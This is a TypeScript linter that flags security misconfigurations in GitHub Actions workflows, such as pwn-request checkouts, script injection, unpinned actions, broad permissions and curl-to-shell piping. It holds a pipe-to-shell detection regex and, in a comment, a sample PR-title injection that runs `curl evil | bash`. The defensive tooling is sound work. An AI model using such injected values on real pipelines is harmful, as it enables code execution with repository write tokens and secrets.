/**
 * GitHub Actions Validator — a CLIENT-SIDE, dependency-free checker that parses
 * a GitHub Actions workflow YAML and reports structural errors plus SECURITY
 * misconfigurations.
 *
 * ┌──────────────────────────────────────────────────────────────────────────┐
 * │  WHAT THIS IS                                                              │
 * │                                                                            │
 * │  A pragmatic, in-browser linter focused on the security mistakes that      │
 * │  actually leak repository write access or secrets:                         │
 * │                                                                            │
 * │    • pull_request_target + checkout of the PR head  → runs UNTRUSTED code  │
 * │      with a privileged token (the classic "pwn request").                  │
 * │    • script injection — untrusted ${{ github.event.* }} expanded straight  │
 * │      into a shell `run:` block.                                            │
 * │    • unpinned third-party actions — `uses: owner/repo@v4` / `@main` can be │
 * │      moved to malicious code; pin to a full 40-char commit SHA.            │
 * │    • over-broad or implicit permissions — `write-all` or no top-level      │
 * │      `permissions:` (the default token is broader than most jobs need).    │
 * │    • `curl … | bash` / `wget … | sh` — piping the network into a shell.    │
 * │    • secrets used in pull_request-triggered workflows (forks).             │
 * │                                                                            │
 * │  It parses YAML for structure, then runs a RAW LINE SCAN to attach honest  │
 * │  line numbers to each finding (GitHub expressions and shell snippets are   │
 * │  easier to locate textually than via the parsed tree). It never throws:    │
 * │  a YAML parse failure returns { ok:false, error } with zero findings.      │
 * └──────────────────────────────────────────────────────────────────────────┘
 */

// js-yaml v4 ships ESM but no bundled type declarations, and @types/js-yaml is
// not a project dependency. Declare the tiny surface we use so the project
// type-checks under strict mode without adding a dependency.
declare module 'js-yaml' {
  export function load(input: string, options?: unknown): unknown;
  const _default: { load: typeof load };
  export default _default;
}

import yaml from 'js-yaml';
import type { Finding, Severity, ValidateResult } from './types';

/* ────────────────────────────────────────────────────────────────────────── *
 *  Parsed-document shapes (loose — user input is validated as we read it).
 * ────────────────────────────────────────────────────────────────────────── */

interface WorkflowStep {
  uses?: unknown;
  run?: unknown;
  with?: Record<string, unknown>;
  name?: unknown;
  id?: unknown;
}

interface WorkflowJob {
  'runs-on'?: unknown;
  uses?: unknown;
  steps?: unknown;
  permissions?: unknown;
}

interface Workflow {
  on?: unknown;
  jobs?: unknown;
  permissions?: unknown;
  name?: unknown;
}

/* ────────────────────────────────────────────────────────────────────────── *
 *  Small helpers.
 * ────────────────────────────────────────────────────────────────────────── */

function isRecord(v: unknown): v is Record<string, unknown> {
  return typeof v === 'object' && v !== null && !Array.isArray(v);
}

/** Coerce a YAML scalar that may be a string into a trimmed string (else ''). */
function asString(v: unknown): string {
  return typeof v === 'string' ? v : '';
}

/**
 * Best-effort line-referenced description of a js-yaml parse error. Mirrors the
 * AlertLint engine so error messaging is consistent across tools.
 */
function describeYamlError(e: unknown): string {
  if (e && typeof e === 'object') {
    const err = e as {
      reason?: string;
      mark?: { line?: number; column?: number };
      message?: string;
    };
    if (err.reason && err.mark && typeof err.mark.line === 'number') {
      return `${err.reason} (line ${err.mark.line + 1}, column ${(err.mark.column ?? 0) + 1}).`;
    }
    if (err.message) return err.message;
  }
  return String(e);
}

/**
 * Find the 1-based line number of the first raw line matching `test`, optionally
 * starting the search at `fromLine` (1-based). Returns undefined if not found.
 * Used to attach honest line numbers to findings located by text scan.
 */
function findLine(
  lines: string[],
  test: (line: string) => boolean,
  fromLine = 1,
): number | undefined {
  for (let i = Math.max(0, fromLine - 1); i < lines.length; i++) {
    if (test(lines[i])) return i + 1;
  }
  return undefined;
}

/* ────────────────────────────────────────────────────────────────────────── *
 *  Security-detection regexes (documented at their use sites).
 * ────────────────────────────────────────────────────────────────────────── */

/**
 * Untrusted GitHub-context expressions an attacker controls via a PR/issue/comment.
 * These are the classic script-injection vectors: their *values* are attacker
 * text, so interpolating them into a shell line lets the attacker run commands.
 * (We intentionally do NOT flag safe contexts like github.sha or github.ref_name
 * derived server-side, nor github.token.)
 */
const UNTRUSTED_CONTEXT_RE =
  /\$\{\{\s*(?:github\.event\.(?:issue|pull_request|comment|review|discussion|head_commit)?\.?(?:title|body|head_ref|label\.name|user\.login|description|message)|github\.head_ref|github\.event\.pull_request\.head\.ref|github\.event\.pull_request\.head\.label|github\.event\.commits|github\.event\.pages)\b[^}]*\}\}/i;

/** Any `${{ ... }}` GitHub expression, used to scope the injection scan to run blocks. */
const ANY_EXPRESSION_RE = /\$\{\{[^}]*\}\}/;

/** `uses: owner/repo@ref` — captures owner, repo path and the ref after `@`. */
const USES_REF_RE = /^([\w.-]+)\/([\w./-]+)@(.+)$/;

/** A full 40-char (or longer, e.g. SHA-256) hex commit SHA — the safe pin target. */
const FULL_SHA_RE = /^[0-9a-f]{40,}$/i;

/** `curl … | bash` / `wget … | sh` (and `| sudo bash`, `|sh`, etc.). */
const PIPE_TO_SHELL_RE =
  /(?:curl|wget)\b[^\n|]*\|\s*(?:sudo\s+)?(?:ba|z|k|da)?sh\b/i;

/* ────────────────────────────────────────────────────────────────────────── *
 *  Public API.
 * ────────────────────────────────────────────────────────────────────────── */

/**
 * Validate a GitHub Actions workflow YAML. NEVER throws: a parse failure returns
 * { ok:false, error }, an empty document returns a single structural error, and
 * any unexpected internal error is caught and surfaced as a generic error.
 */
export function validate(yamlText: string): ValidateResult {
  const empty = { errors: 0, warnings: 0, infos: 0 };

  // 0. Defensive: the contract is `string`, but never throw even if a caller
  // passes null/undefined/non-string at runtime.
  if (typeof yamlText !== 'string') {
    return {
      ok: false,
      error: 'Paste a GitHub Actions workflow YAML to validate.',
      findings: [],
      summary: { ...empty },
    };
  }

  // Empty input is not a parse error — guide the user instead.
  if (yamlText.trim() === '') {
    return {
      ok: false,
      error: 'Paste a GitHub Actions workflow YAML to validate.',
      findings: [],
      summary: { ...empty },
    };
  }

  // 1. Parse YAML. Any failure is a line-referenced, fatal error.
  let doc: unknown;
  try {
    doc = yaml.load(yamlText);
  } catch (e) {
    return {
      ok: false,
      error: `Could not parse YAML: ${describeYamlError(e)}`,
      findings: [],
      summary: { ...empty },
    };
  }

  if (!isRecord(doc)) {
    return {
      ok: false,
      error:
        'The document is not a YAML mapping. A workflow must be a top-level object with `on:` and `jobs:` keys.',
      findings: [],
      summary: { ...empty },
    };
  }

  const lines = yamlText.split(/\r?\n/);
  const findings: Finding[] = [];
  const add = (f: Finding) => findings.push(f);

  try {
    const wf = doc as Workflow;
    runStructuralChecks(wf, lines, add);
    runSecurityChecks(wf, yamlText, lines, add);
  } catch (e) {
    // The contract says never throw. If a heuristic trips on unexpected input,
    // degrade gracefully to an info note rather than losing the whole run.
    add({
      id: 'internal-analysis-incomplete',
      severity: 'info',
      title: 'Some checks could not complete.',
      detail: `An internal check stopped early on this input (${String(e)}). Structural results above are still valid.`,
    });
  }

  return finalize(findings);
}

/* ────────────────────────────────────────────────────────────────────────── *
 *  Structural checks — is this a well-formed workflow at all?
 * ────────────────────────────────────────────────────────────────────────── */

function runStructuralChecks(
  wf: Workflow,
  lines: string[],
  add: (f: Finding) => void,
): void {
  // A workflow MUST declare a trigger. js-yaml (YAML 1.2 core schema) keeps the
  // key `on` as the string `"on"`, so `wf.on` is the trigger value directly; an
  // empty `on:` parses to null, which we treat as a missing trigger.
  const hasOn = wf.on !== undefined && wf.on !== null;
  if (!hasOn) {
    add({
      id: 'missing-on',
      severity: 'error',
      title: 'Workflow has no `on:` trigger.',
      detail:
        'Every workflow must declare at least one event under `on:` (for example push, pull_request, or workflow_dispatch). Without it GitHub will never run the workflow.',
      line: findLine(lines, (l) => /^\s*on\s*:/.test(l)),
      remediation: 'Add a top-level `on:` block, e.g. `on: [push]` or `on: { pull_request: {} }`.',
    });
  }

  // A workflow MUST define jobs, and `jobs:` must be a mapping of job-id → job.
  if (wf.jobs === undefined || wf.jobs === null) {
    add({
      id: 'missing-jobs',
      severity: 'error',
      title: 'Workflow has no `jobs:`.',
      detail: 'A workflow must define at least one job under a top-level `jobs:` mapping.',
      line: findLine(lines, (l) => /^\s*jobs\s*:/.test(l)),
      remediation: 'Add a `jobs:` block containing one or more job definitions.',
    });
    return; // nothing more to check without jobs
  }

  if (!isRecord(wf.jobs)) {
    add({
      id: 'jobs-not-mapping',
      severity: 'error',
      title: '`jobs:` must be a mapping of job IDs to job definitions.',
      detail: 'Found `jobs:` but it is not an object. Each key under `jobs:` is a job ID.',
      line: findLine(lines, (l) => /^\s*jobs\s*:/.test(l)),
      remediation: 'Indent each job under `jobs:` as `<job-id>:` with its own `runs-on`/`steps`.',
    });
    return;
  }

  const jobEntries = Object.entries(wf.jobs as Record<string, unknown>);
  if (jobEntries.length === 0) {
    add({
      id: 'jobs-empty',
      severity: 'error',
      title: '`jobs:` is empty.',
      detail: 'A workflow must define at least one job.',
      line: findLine(lines, (l) => /^\s*jobs\s*:/.test(l)),
      remediation: 'Add a job under `jobs:`.',
    });
    return;
  }

  for (const [jobId, rawJob] of jobEntries) {
    checkJob(jobId, rawJob, lines, add);
  }
}

function checkJob(
  jobId: string,
  rawJob: unknown,
  lines: string[],
  add: (f: Finding) => void,
): void {
  // Locate the job's declaration line so its findings point at the right place.
  const jobLine = findLine(lines, (l) => new RegExp(`^\\s+${escapeRegExp(jobId)}\\s*:`).test(l));

  if (!isRecord(rawJob)) {
    add({
      id: 'job-not-mapping',
      severity: 'error',
      title: `Job “${jobId}” is not a mapping.`,
      detail: 'Each job must be an object with at least `runs-on` (or `uses:` for a reusable workflow).',
      line: jobLine,
      remediation: 'Define the job as `<job-id>:` with `runs-on:` and `steps:` (or `uses:`).',
    });
    return;
  }

  const job = rawJob as WorkflowJob;

  // A job is valid if it either runs on a runner OR calls a reusable workflow.
  const hasRunsOn = job['runs-on'] !== undefined && job['runs-on'] !== null;
  const isReusable = typeof job.uses === 'string' && job.uses.trim() !== '';
  if (!hasRunsOn && !isReusable) {
    add({
      id: 'job-missing-runs-on',
      severity: 'error',
      title: `Job “${jobId}” has no \`runs-on\` or \`uses\`.`,
      detail:
        'A job must specify the runner it executes on (`runs-on:`) or reference a reusable workflow (`uses:`).',
      line: jobLine,
      remediation: 'Add `runs-on: ubuntu-latest` (or another runner), or `uses:` a reusable workflow.',
    });
  }

  // Reusable-workflow jobs do not contain steps; only validate steps otherwise.
  if (isReusable) return;

  if (job.steps === undefined || job.steps === null) {
    add({
      id: 'job-missing-steps',
      severity: 'warning',
      title: `Job “${jobId}” has no \`steps\`.`,
      detail: 'A runner-based job with no steps does nothing. Did you forget to add steps?',
      line: jobLine,
      remediation: 'Add a `steps:` list, even if just a single `run:` or `uses:` step.',
    });
    return;
  }

  if (!Array.isArray(job.steps)) {
    add({
      id: 'steps-not-list',
      severity: 'error',
      title: `\`steps\` for job “${jobId}” must be a list.`,
      detail: 'Steps are a YAML sequence; each item is a step with `uses:` or `run:`.',
      line: jobLine,
      remediation: 'Make `steps:` a list of `- uses: …` / `- run: …` items.',
    });
    return;
  }

  job.steps.forEach((rawStep, idx) => {
    if (!isRecord(rawStep)) {
      add({
        id: 'step-not-mapping',
        severity: 'error',
        title: `Step ${idx + 1} in job “${jobId}” is not a mapping.`,
        detail: 'Each step must be an object containing either `uses:` or `run:`.',
        line: jobLine,
        remediation: 'Write each step as `- uses: …` or `- run: …`.',
      });
      return;
    }
    const step = rawStep as WorkflowStep;
    const hasUses = typeof step.uses === 'string' && step.uses.trim() !== '';
    const hasRun = typeof step.run === 'string' && step.run.trim() !== '';
    if (!hasUses && !hasRun) {
      add({
        id: 'step-missing-action',
        severity: 'error',
        title: `Step ${idx + 1} in job “${jobId}” has neither \`uses\` nor \`run\`.`,
        detail: 'A step must either run a shell command (`run:`) or invoke an action (`uses:`).',
        line: jobLine,
        remediation: 'Add a `run:` command or a `uses:` action reference to the step.',
      });
    }
  });
}

function escapeRegExp(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

/* ────────────────────────────────────────────────────────────────────────── *
 *  Security checks — the differentiator.
 * ────────────────────────────────────────────────────────────────────────── */

function runSecurityChecks(
  wf: Workflow,
  text: string,
  lines: string[],
  add: (f: Finding) => void,
): void {
  const triggers = collectTriggers(wf.on);
  const usesPullRequestTarget = triggers.has('pull_request_target');
  const usesPullRequest = triggers.has('pull_request');

  checkPwnRequest(usesPullRequestTarget, text, lines, add);
  checkScriptInjection(wf, lines, add);
  checkUnpinnedActions(lines, add);
  checkPermissions(wf, lines, add);
  checkPipeToShell(lines, add);
  checkSecretsInPullRequest(usesPullRequest || usesPullRequestTarget, lines, add);
}

/**
 * Collect the set of trigger event names from `on:`, which may be a string,
 * a list of strings, or a mapping of event → config.
 */
function collectTriggers(on: unknown): Set<string> {
  const set = new Set<string>();
  if (typeof on === 'string') {
    set.add(on);
  } else if (Array.isArray(on)) {
    for (const e of on) if (typeof e === 'string') set.add(e);
  } else if (isRecord(on)) {
    for (const k of Object.keys(on)) set.add(k);
  }
  return set;
}

/* (a) ─ pull_request_target + checkout of PR head → arbitrary code execution ─
 *
 * `pull_request_target` runs with a READ/WRITE token AND access to secrets,
 * evaluated against the BASE repo — but if the workflow then checks out the PR
 * head (`ref: ${{ github.event.pull_request.head.sha }}` / `head.ref`, or
 * `ref: refs/pull/.../merge`), it executes attacker-controlled code with that
 * privileged token. This is the canonical "pwn request" supply-chain hole.
 */
function checkPwnRequest(
  usesPullRequestTarget: boolean,
  text: string,
  lines: string[],
  add: (f: Finding) => void,
): void {
  if (!usesPullRequestTarget) return;

  const hasCheckout = /uses:\s*actions\/checkout@/i.test(text);
  // Checking out the PR head specifically — the dangerous bit.
  const checksOutPrHead =
    /ref:\s*\$\{\{\s*github\.event\.pull_request\.head\.(?:sha|ref)\s*\}\}/i.test(text) ||
    /ref:\s*\$\{\{\s*github\.head_ref\s*\}\}/i.test(text) ||
    /ref:\s*refs\/pull\//i.test(text);

  if (hasCheckout && checksOutPrHead) {
    const line =
      findLine(lines, (l) => /ref:\s*\$\{\{\s*github\.(?:event\.pull_request\.head|head_ref)/i.test(l)) ??
      findLine(lines, (l) => /pull_request_target/i.test(l));
    add({
      id: 'pull-request-target-checkout',
      severity: 'error',
      title: 'pull_request_target checks out untrusted PR code.',
      detail:
        'This workflow triggers on `pull_request_target` (privileged token + secrets) and checks out the pull request head. Any fork contributor can run arbitrary code with your repository’s write token — the classic “pwn request” vulnerability.',
      line,
      remediation:
        'Do not check out PR head in `pull_request_target`. Use `pull_request` for untrusted code, or split into a privileged job (no checkout of PR code) and an unprivileged build job, and never expose secrets to checked-out PR code.',
    });
  } else if (hasCheckout) {
    // Checkout present but we could not prove it targets the PR head — still
    // worth a warning, because the default checkout under pull_request_target
    // is the base ref (safer) but the combination is easy to make unsafe.
    add({
      id: 'pull-request-target-checkout-review',
      severity: 'warning',
      title: 'pull_request_target uses checkout — review carefully.',
      detail:
        'A `pull_request_target` workflow runs with a privileged token and secrets. Combining it with `actions/checkout` is risky: if any step builds, installs, or runs code from the PR, a fork can execute code with your write token.',
      line: findLine(lines, (l) => /pull_request_target/i.test(l)),
      remediation:
        'Confirm you never execute PR-provided code (build scripts, dependencies, makefiles) in this workflow, or move untrusted work to a separate `pull_request` workflow.',
    });
  }
}

/* (b) ─ Script injection via untrusted ${{ github.event.* }} in `run:` ────────
 *
 * GitHub expands `${{ … }}` BEFORE the shell runs. If an attacker-controlled
 * value (PR title/body, branch name, comment, …) is interpolated directly into
 * a `run:` block, the attacker can break out of the intended command and run
 * their own — e.g. a PR title of `"; curl evil | bash; #` becomes shell code.
 * We scan each `run:` block's source lines for these untrusted contexts.
 */
function checkScriptInjection(
  wf: Workflow,
  lines: string[],
  add: (f: Finding) => void,
): void {
  // Only scan lines that belong to a `run:` shell block. Interpolating an
  // untrusted context into a `with:`/`env:` INPUT (e.g. `ref: ${{ github.head_ref }}`)
  // is NOT shell injection, so scanning the whole document would false-positive.
  const RUN_RE = /^(\s*)(?:-\s*)?run:\s*(.*)$/;
  const seenLines = new Set<number>();

  const flag = (ln: number, text: string) => {
    if (seenLines.has(ln)) return;
    if (ANY_EXPRESSION_RE.test(text) && UNTRUSTED_CONTEXT_RE.test(text)) {
      seenLines.add(ln);
      add({
        id: 'script-injection',
        severity: 'warning',
        title: 'Untrusted input interpolated into a shell command.',
        detail:
          'An attacker-controlled GitHub context (such as a PR title, body, or branch name) is expanded directly inside a `run:` step. Because `${{ … }}` is substituted before the shell executes, a malicious value can inject and run arbitrary commands.',
        line: ln,
        remediation:
          'Pass the value through an environment variable instead of inline interpolation, e.g. set `env: { TITLE: ${{ github.event.pull_request.title }} }` and reference `"$TITLE"` in the script (quoted).',
      });
    }
  };

  for (let i = 0; i < lines.length; i++) {
    const m = lines[i].match(RUN_RE);
    if (!m) continue;
    const indent = m[1].length;
    const inline = m[2].trim();
    if (/^[|>]/.test(inline)) {
      // Block scalar (`run: |` / `run: >`): scan the more-indented body lines.
      for (let j = i + 1; j < lines.length; j++) {
        if (lines[j].trim() === '') continue;
        const lineIndent = lines[j].length - lines[j].replace(/^\s+/, '').length;
        if (lineIndent <= indent) break; // dedent → block ended
        flag(j + 1, lines[j]);
      }
    } else {
      // Inline `run:` command on the same line.
      flag(i + 1, lines[i]);
    }
  }
}

/* (c) ─ Unpinned third-party actions (`uses: owner/repo@vN` / `@branch`) ──────
 *
 * A tag or branch ref is MUTABLE: the owner (or an attacker who compromises the
 * action repo) can repoint `v4`/`main` at malicious code that then runs with
 * your workflow’s token. Pinning to a full commit SHA freezes the exact code.
 * First-party `actions/*` and `github/*` are lower risk (info, not warning) but
 * the same advice applies.
 */
function checkUnpinnedActions(lines: string[], add: (f: Finding) => void): void {
  for (let i = 0; i < lines.length; i++) {
    const m = lines[i].match(/uses:\s*['"]?([^'"#\s]+)['"]?/i);
    if (!m) continue;
    const ref = m[1].trim();

    // Skip local actions (`./path`) and Docker refs (`docker://…`) — different
    // pinning rules; SHA pinning does not apply.
    if (ref.startsWith('./') || ref.startsWith('docker://')) continue;

    const refMatch = ref.match(USES_REF_RE);
    if (!refMatch) continue; // not an owner/repo@ref form (e.g. reusable local)

    const owner = refMatch[1];
    const after = refMatch[3].trim();
    // Some uses include a subpath: owner/repo/path@ref — `owner` is still index 1.
    if (FULL_SHA_RE.test(after)) continue; // already pinned to a commit SHA ✓

    const firstParty = /^(actions|github)$/i.test(owner);
    add({
      id: firstParty ? 'unpinned-first-party-action' : 'unpinned-action',
      severity: firstParty ? 'info' : 'warning',
      title: firstParty
        ? `First-party action “${ref}” is pinned to a tag, not a SHA.`
        : `Third-party action “${ref}” is not pinned to a commit SHA.`,
      detail: firstParty
        ? 'This action is maintained by GitHub, so the risk is lower, but tags and branches are still mutable. Pinning to a full commit SHA guarantees the exact code you reviewed runs every time.'
        : 'This action is referenced by a mutable tag or branch (e.g. `@v4` or `@main`). The maintainer — or anyone who compromises the action — can repoint it to malicious code that runs with your workflow’s token and secrets.',
      line: i + 1,
      remediation: `Pin to a full 40-character commit SHA, e.g. \`uses: ${owner}/…@<sha>\`, and add a comment with the human-readable version. Tools like Dependabot can keep the SHA up to date.`,
    });
  }
}

/* (d) ─ Over-broad or implicit permissions ───────────────────────────────────
 *
 * `permissions: write-all` (or `contents: write` everywhere) grants the job
 * token far more than it needs; a compromised step or action then has broad
 * write access. With NO top-level `permissions:`, the token defaults to the
 * repository/org setting — historically read/write — which is broader than the
 * least-privilege default of read-only. Recommend declaring least privilege.
 */
function checkPermissions(
  wf: Workflow,
  lines: string[],
  add: (f: Finding) => void,
): void {
  const topPerms = wf.permissions;

  const isWriteAll = (p: unknown): boolean =>
    p === 'write-all' || (typeof p === 'string' && p.trim().toLowerCase() === 'write-all');

  if (isWriteAll(topPerms)) {
    add({
      id: 'permissions-write-all',
      severity: 'warning',
      title: 'Top-level `permissions: write-all` is over-broad.',
      detail:
        '`write-all` grants the GITHUB_TOKEN write access to every scope (contents, packages, deployments, …). A single compromised step or action then inherits all of it.',
      line: findLine(lines, (l) => /permissions:\s*write-all/i.test(l)),
      remediation:
        'Declare only the scopes you need, e.g. `permissions: { contents: read }`, and elevate per-job where a specific write is required.',
    });
  } else if (topPerms === undefined || topPerms === null) {
    // No top-level permissions — check whether jobs declare their own; if none
    // do, the default token scope applies and we recommend an explicit default.
    let anyJobDeclares = false;
    if (isRecord(wf.jobs)) {
      for (const job of Object.values(wf.jobs as Record<string, unknown>)) {
        if (isRecord(job) && (job as WorkflowJob).permissions !== undefined) {
          anyJobDeclares = true;
        }
        // A job that sets write-all is also worth flagging.
        if (isRecord(job) && isWriteAll((job as WorkflowJob).permissions)) {
          anyJobDeclares = true;
        }
      }
    }
    if (!anyJobDeclares) {
      add({
        id: 'permissions-missing',
        severity: 'warning',
        title: 'No top-level `permissions:` — token defaults are broad.',
        detail:
          'Without an explicit `permissions:` block, the GITHUB_TOKEN inherits the repository/organization default, which can be read/write. Declaring least privilege limits the blast radius if a step is compromised.',
        line: 1,
        remediation:
          'Add a top-level `permissions: { contents: read }` (or `permissions: read-all`) and grant additional scopes only to the jobs that need them.',
      });
    }
  }

  // Also flag any job that opts into write-all even when the top level is fine.
  if (isRecord(wf.jobs)) {
    for (const [jobId, job] of Object.entries(wf.jobs as Record<string, unknown>)) {
      if (isRecord(job) && isWriteAll((job as WorkflowJob).permissions)) {
        add({
          id: 'job-permissions-write-all',
          severity: 'warning',
          title: `Job “${jobId}” requests \`permissions: write-all\`.`,
          detail:
            'This job grants its token write access to every scope. Scope it down to only what the job needs.',
          line: findLine(lines, (l) => /permissions:\s*write-all/i.test(l)),
          remediation: 'Replace `write-all` with the specific scopes the job requires.',
        });
      }
    }
  }
}

/* (e) ─ `curl … | bash` / `wget … | sh` in run steps ─────────────────────────
 *
 * Piping a network download straight into a shell runs whatever the server
 * returns — there is no review, no checksum, and a compromised or MITM’d host
 * executes arbitrary code in your runner with its token and secrets.
 */
function checkPipeToShell(lines: string[], add: (f: Finding) => void): void {
  for (let i = 0; i < lines.length; i++) {
    if (PIPE_TO_SHELL_RE.test(lines[i])) {
      add({
        id: 'pipe-to-shell',
        severity: 'warning',
        title: 'Piping a network download directly into a shell.',
        detail:
          'A `curl … | bash` / `wget … | sh` pattern executes whatever the remote server returns, with no integrity check. A compromised host, hijacked domain, or MITM lets an attacker run arbitrary code on the runner.',
        line: i + 1,
        remediation:
          'Download to a file, verify a checksum/signature, then execute — or install via a pinned, trusted action or package manager instead.',
      });
    }
  }
}

/* (f) ─ secrets.* used in pull_request-triggered workflows (INFO) ─────────────
 *
 * `pull_request` from a fork does NOT expose repository secrets by default
 * (a safety measure), so referencing `secrets.*` in such a workflow either does
 * nothing useful for forks or — if it’s actually `pull_request_target` — runs
 * with secrets against untrusted code. Flag as info so the author confirms intent.
 */
function checkSecretsInPullRequest(
  prTriggered: boolean,
  lines: string[],
  add: (f: Finding) => void,
): void {
  if (!prTriggered) return;
  const line = findLine(lines, (l) => /\$\{\{\s*secrets\./i.test(l));
  if (line !== undefined) {
    add({
      id: 'secrets-in-pull-request',
      severity: 'info',
      title: 'Secrets referenced in a pull_request-triggered workflow.',
      detail:
        'Workflows triggered by `pull_request` from a fork do not receive repository secrets by default. If this runs as `pull_request_target`, the secrets ARE available to untrusted PR code — make sure that is intended.',
      line,
      remediation:
        'Confirm whether forks need these secrets. Prefer running secret-dependent steps on a trusted event (push, workflow_run) rather than untrusted PRs.',
    });
  }
}

/* ────────────────────────────────────────────────────────────────────────── *
 *  Finalize — sort by severity, de-duplicate, and roll up counts.
 * ────────────────────────────────────────────────────────────────────────── */

const SEVERITY_ORDER: Record<Severity, number> = { error: 0, warning: 1, info: 2 };

function finalize(findings: Finding[]): ValidateResult {
  // De-duplicate identical (id, line) findings that two passes might both emit.
  const seen = new Set<string>();
  const deduped: Finding[] = [];
  for (const f of findings) {
    const key = `${f.id}@${f.line ?? '-'}`;
    if (seen.has(key)) continue;
    seen.add(key);
    deduped.push(f);
  }

  // Stable sort: severity first, then by line number (undefined lines last).
  deduped.sort((a, b) => {
    const s = SEVERITY_ORDER[a.severity] - SEVERITY_ORDER[b.severity];
    if (s !== 0) return s;
    const al = a.line ?? Number.MAX_SAFE_INTEGER;
    const bl = b.line ?? Number.MAX_SAFE_INTEGER;
    return al - bl;
  });

  const summary = {
    errors: deduped.filter((f) => f.severity === 'error').length,
    warnings: deduped.filter((f) => f.severity === 'warning').length,
    infos: deduped.filter((f) => f.severity === 'info').length,
  };

  return { ok: true, findings: deduped, summary };
}
